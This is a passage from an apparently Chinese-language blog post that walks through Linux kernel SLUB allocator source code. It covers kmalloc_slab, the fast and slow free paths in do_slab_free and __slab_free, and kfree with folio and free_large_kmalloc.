结构体</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> 和 <code>size_index_elem()</code> 的定义都非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图"><a href="#三、上层调用接口关系图" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>因为很多比如说 <code>__kmem_cache_alloc_lru()</code> 一类的函数其实最后都是对 <code>slab_alloc_node()</code> 的套娃，这里笔者直接给出一个简易的调用关系图：</p><blockquote><p>只截取了笔者认为比较主要的那些，<del>因为作图作到后面实在蚌埠住了</del></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1 id="0x03-对象的释放"><a href="#0x03-对象的释放" class="headerlink" title="0x03. 对象的释放"></a>0x03. 对象的释放</h1><h2 id="※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）"><a href="#※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）" class="headerlink" title="※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）"></a>※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）</h2><p>在 slab allocator 中存在着多个不同的内存释放接口，其最后都会调用到 <code>do_slab_free()</code> 完成内存释放的工作，需要注意的是该函数  <em><strong>允许释放已经连接成一条 freelist 且已经加密好的多个对象</strong></em>  ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 强制内联快速路径以创造无需额外的函数调用便能完成快速路径释放的kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径仅在我们要释放会当前 cpu slab 时生效.</span><br><span class="hljs-comment"> * 这通常是在我们刚刚分配了该对象的情况.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若快速路径不可用则退回 __slab_free 以处理所有种类的特殊处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 通过指定 head &amp; tail 指针 加上对象数量（cnt），可以大量释放包含多个对象的freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>与分配类似，释放同样分为快速路径与慢速路径</p><h3 id="I-直接释放回-percpu-slab（fast-path）"><a href="#I-直接释放回-percpu-slab（fast-path）" class="headerlink" title="I. 直接释放回 percpu slab（fast path）"></a>I. 直接释放回 percpu slab（fast path）</h3><p>快速路径比较简单，主要就是<strong>对比待释放对象所属 slab 是否为 percpu slab，若是则直接挂回去即可，遵循 LIFO 机制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确定当前的 per cpu slab. </span><br><span class="hljs-comment"> * cpu 可能在之后改变.但由于数据已经通过该指针获得，这并没问题.</span><br><span class="hljs-comment"> * 若我们在 cmpxchg 期间在同一 cpu 上，释放将会成功.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* 与 slab_alloc_node() 中在 barrier() 上的注释一样 */</span><br>barrier();<br><br><span class="hljs-comment">// 不属于 percpu slab，调用 __slab_free() 进行释放</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-：释放回对应的-slab（slow-path）"><a href="#II-slab-free-：释放回对应的-slab（slow-path）" class="headerlink" title="II. __slab_free()：释放回对应的 slab（slow path）"></a>II. __slab_free()：释放回对应的 slab（slow path）</h3><p>如果待释放对象不属于 percpu clab，则调用 <code>__slab_free()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 处理慢速路径. 这可能会被频繁调用因为在大部分情况下对象比cpu slab生命周期更长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所以我们仍尝试减少缓存行的使用率. 拿取 slab lock 并释放对象即可.</span><br><span class="hljs-comment"> * 若不需要额外的 partial slab handling 我们便可立即返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>首先还是 kfence 和 debug 相关，如果该 <code>kmem_cache</code> 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位则直接调用 <code>free_to_partial_list()</code> 后返回即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是一个 <code>do while</code> 循环，首先会将 <strong><code>待释放 freelist 所属 slab 的 freelist</code></strong> 连接到 <strong><code>待释放 freelist 的 tail object</code></strong> 后边，这里的 <code>new</code> 是一个栈上的临时 slab 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>接下来检查是否  <strong><code>(所有的对象都*将*为空闲对象 || 原 slab 上无空闲对象) &amp;&amp; slab 未被冻结</code></strong> ，若满足该条件则：</p><ul><li>检查是否有 percpu partial slab 且原 slab 上无空闲对象（即 slab-&gt;freelist（也就是代码中的 <code>prior</code>）为 NULL）：<ul><li>若是，则设置 slab 将被冻结（<code>new.frozen=1</code>）</li><li>若否，则获取 slab 所对应的 <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 之前不在链表上且将会部分为空</span><br><span class="hljs-comment"> * 我们可以推迟链表移动，而是反之将其冻结.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 需要从一个链表上取下 */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 推测性地获取 list_lock.</span><br><span class="hljs-comment"> * 若 cmpxchg 未成功，则我们可能</span><br><span class="hljs-comment"> * 在不进行任何处理的情况下放弃 list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则 list_lock 将与其他处理器同步更新 slabs 链表</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环的终止条件用了一个 <code>cmpxchg_double_slab()</code> 函数，<del>套娃套得👴头昏眼花</del>，主要逻辑为：</p><ul><li><strong>对比 slab-&gt;freelist &#x3D;&#x3D; prior &amp;&amp; slab-&gt;counters &#x3D;&#x3D; counters，若是，则将 slab-&gt;freelist 设为 head 且将 slab-&gt;counters 设为 new.counters</strong>，该操作成功则返回 true，条件不符则返回 false</li></ul><p>成功了循环将会直接跳出：）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>接下来检查<strong>该 slab 是否需要从一个 <code>kmem_cache_node</code> 的链表上取下，若否，</strong>则：</p><ul><li>若 slab 已经被冻结，stat() 一下（基本上等于啥都不做）</li><li>若 slab 需要被冻结 （<code>new.frozen</code> 为 true），调用 <code>put_cpu_partial()</code> 直接将 slab 放到 percpu partial 链表</li><li>释放工作完成，返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 链表锁未被占用，因此不需要活跃任何链表.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 slab 上所有对象都被释放，且 node 上的 partial slab 数量已经超过 <code>kmem_cache-&gt;min_partial</code> ，<strong>这意味着这是一张完全空闲的 slab</strong>，接下来跳转到 <code>slab_empty</code> 标签，该标签对应代码块主要是：</p><ul><li>若 slab 上原来有空闲对象（位于 node partial 链表），则从 partial 链表移除</li><li>若 slab 上原来无空闲对象（位于 node full 链表），则从 full 链表移除</li><li><strong>最后调用 <code>discard_slab()</code> 释放这一张 slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>若不满足上面的条件，则检查是否没有 percpu partial slab 且 slab 上原 freelist 为 NULL（即位于 node full 链表），若是则从 full 链表移除并添加到 node partial 链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>至此， slub 算法的释放逻辑分析完毕</p><h2 id="二、kfree：通用的上层释放接口"><a href="#二、kfree：通用的上层释放接口" class="headerlink" title="二、kfree：通用的上层释放接口"></a>二、kfree：通用的上层释放接口</h2><p>正如同 <code>kmalloc()</code> 是最为通用的内核对象分配函数，与之相对应的释放函数便是 <code>kfree()</code> 了，这个函数其实主要就是 <code>__kmem_cache_free()</code> 的 wrapper，对于较大的对象则会用 <code>free_large_kmalloc()</code> 进行释放，如果 object 为 NULL 则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - 释放之前分配的对象</span><br><span class="hljs-comment"> * @object: kmalloc 返回的指针.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若 @object 为 NULL, 则不会进行任何操作.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 不要释放不由 kmalloc() 分配的内存，否则会出问题.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-结构：一段物理、虚拟、逻辑上都连续的内存"><a href="#I-folio-结构：一段物理、虚拟、逻辑上都连续的内存" class="headerlink" title="I. folio 结构：一段物理、虚拟、逻辑上都连续的内存"></a>I. folio 结构：一段物理、虚拟、逻辑上都连续的内存</h3><p>注意到这里用了一个名为 <code>folio</code> 的结构体，其表示了<strong>一块物理、虚拟、逻辑上都连续的内存</strong>，  <em>其实本质上还是复用了 page 结构体，只不过这一次是将 page 转为 folio</em>  ，定义比较长这里就不贴代码了</p><p><code>virt_to_folio()</code> 首先会用 <code>virt_to_page()</code> 找到待释放对象虚拟地址对应的 <code>page</code> 结构体，之后用 <code>page_folio()</code> 将其转换为 folio 结构体——其实就是对于复合页而言会找到第一张页面，由此如果是复合页的话那说明是大 slab 所以会调用 <code>free_large_kmalloc()</code>，不是复合页说明是小 slab 所以会调用 <code>__kmem_cache_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>然后 <code>folio_test_slab()</code> 其实是 <code>include/linux/page-flags.h</code> 里的拼接宏，这里就不深入展开了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-：直接将页面释放回-buddy-system"><a href="#II-free-large-kmalloc-：直接将页面释放回-buddy-system" class="headerlink" title="II. free_large_kmalloc()：直接将页面释放回 buddy system"></a>II. free_large_kmalloc()：直接将页面释放回 buddy system</h3><p>正如对于大对象的分配 <code>kmalloc_large()</code> 会直接从 buddy system 请求内存一般，相对应的 <code>free_large_kmalloc()</code> 也会直接将页面释放回 buddy system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 